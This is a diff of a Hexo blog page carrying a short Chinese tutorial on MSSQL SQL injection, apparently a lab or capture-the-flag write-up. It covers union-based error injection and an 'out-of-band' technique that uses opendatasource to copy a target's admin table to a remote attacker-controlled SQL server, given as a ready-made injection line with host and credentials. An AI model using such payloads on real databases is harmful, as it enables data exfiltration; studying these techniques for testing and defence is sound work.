@@ -5,12 +5,12 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>归档: 2019/3</title>
+    <title>MSSQL-反弹注入 - Hexo</title>
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate">
     <meta name="keywords" content="npmlab,"> 
-    
+    <meta name="description" content="##＃　显错注入在讲MSSQL反弹注入前先说一下MSSQL的显错注入MSSQL联合查询：UNION ALL然后猜出输出点要使用null去填充，比如：没有sql的union select 1,2,3 ,"> 
     <meta name="author" content="John Doe"> 
     <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -30,86 +30,67 @@
 <body class="loading">
     <span id="config-title" style="display:none">Hexo</span>
     <div id="loader"></div>
-    <div id="single" class="page">
-    <div id="top">
-        <a class="icon-left image-icon" href="javascript:history.back()"></a>
-    </div>
-    <div class="section">
-        <div class="article">
-            <div class="main">
-                <div class="content">
-                    <div class="timeline">
-                      <h2 class="timeline-title">归档: 11篇</h2>
-                      
-                        
-                          <h3 class="timeline-subtitle">2019</h3>
-                        
-                        <div class="timeline-item">
-                          <time>2019-03-30</time>
-                          <a target="_self" href="/2019/03/30/XSS原理/">XSS原理</a>
-                        </div>
-                      
-                        
-                        <div class="timeline-item">
-                          <time>2019-03-30</time>
-                          <a target="_self" href="/2019/03/30/MSSQL/">MSSQL-反弹注入</a>
-                        </div>
-                      
-                        
-                        <div class="timeline-item">
-                          <time>2019-03-30</time>
-                          <a target="_self" href="/2019/03/30/Oracle注入/">Oracle原理</a>
-                        </div>
-                      
-                        
-                        <div class="timeline-item">
-                          <time>2019-03-30</time>
-                          <a target="_self" href="/2019/03/30/SQL-DNS注入/">SQL-DNS注入</a>
-                        </div>
-                      
-                        
-                        <div class="timeline-item">
-                          <time>2019-03-30</time>
-                          <a target="_self" href="/2019/03/30/sql注入/">sql注入1</a>
-                        </div>
-                      
-                        
-                        <div class="timeline-item">
-                          <time>2019-03-30</time>
-                          <a target="_self" href="/2019/03/30/CSRF/">CSRF原理</a>
-                        </div>
-                      
-                        
-                        <div class="timeline-item">
-                          <time>2019-03-30</time>
-                          <a target="_self" href="/2019/03/30/sql注入原理分析/">sql注入原理分析</a>
-                        </div>
-                      
-                        
-                        <div class="timeline-item">
-                          <time>2019-03-30</time>
-                          <a target="_self" href="/2019/03/30/sql注入2/">sql注入2</a>
-                        </div>
-                      
-                        
-                        <div class="timeline-item">
-                          <time>2019-03-30</time>
-                          <a target="_self" href="/2019/03/30/宽字节注入/">MSSQL-反弹注入</a>
-                        </div>
-                      
-                        
-                        <div class="timeline-item">
-                          <time>2019-03-30</time>
-                          <a target="_self" href="/2019/03/30/偏移注入/">偏移注入</a>
-                        </div>
-                      
-                    </div>
-                </div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">MSSQL-反弹注入</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
             </div>
+            <div id="qr"></div>
         </div>
     </div>
+    <div class="scrollbar"></div>
 </div>
 
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">MSSQL-反弹注入</h1>
+        <div class="stuff">
+            <span>三月 30, 2019</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>##＃　显错注入<br>在讲MSSQL反弹注入前先说一下MSSQL的显错注入<br>MSSQL联合查询：UNION ALL<br>然后猜出输出点要使用null去填充，比如：<br>没有sql的union select 1,2,3 改为 union all select null,null,null<br>注释：注释只有–<br>select name from master.dbo.sysdatabase 查询系统库</p>
+<p>查询系统表：dbo.sysobjects 查询系统表 (xtype=”U”)</p>
+<p>dbo.syscolumns 字段 (id=) 指定id</p>
+<h3 id="MSSQL反弹注入"><a href="#MSSQL反弹注入" class="headerlink" title="MSSQL反弹注入"></a>MSSQL反弹注入</h3><p>MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖独特的攻击思路。我们在进行SQL注入时明明是sql注入点却无法进行注入，注入工具猜解速度异常缓慢，错误提示信息关闭，无法返回注入结果等，这些都是注入攻击中常遇到的问题。为了解决以上疑难杂症，比较好的解决方法就是使用反弹注入技术，而反弹注入技术需要依靠opendatasource函数支持。<br><strong>opendatasource函数</strong><br>语法：opendatasource(provider_name,init_string)<br>provider_name：<br>注册为用于访问数据源的OLE DB提供程序的PROGID的名称，MSSQL的名称为SQLOLEDB<br>init_string:<br>链接字符串<br>链接地址，端口，用户名，密码，数据库名<br>sever=链接地址，端口;uid=用户名;pwd=密码;database=数据库名称<br>实现功能:<br>获取所有库.当前库所有表.表里所有内容.分区路径.<br>本机建立库和表,方便反弹时写进东西.<br>然后你需要一个可以查询的表<br>    create table a(in int,name1 char(255),name2 char(255),naem3 char(255));</p>
+<p>然后最重要的一步来了，向靶场插入以下代码：<br>    insert into opendatasource(‘sqloledb’,’server=SQL5006.webweb.com,1433;uid=DB_14A8E52_ddcms_admin;pwd=123456789;database=DB_14A8E52_ddcms’).DB_14A8E52_ddcms .dbo.a select * from admin–<br>最后得到FLAG</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src>
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
+                    
+                        <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-ae="false" data-ci data-cs data-r data-o data-a="npmlab" data-d="false">查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
 </body>
 <script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
 <script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
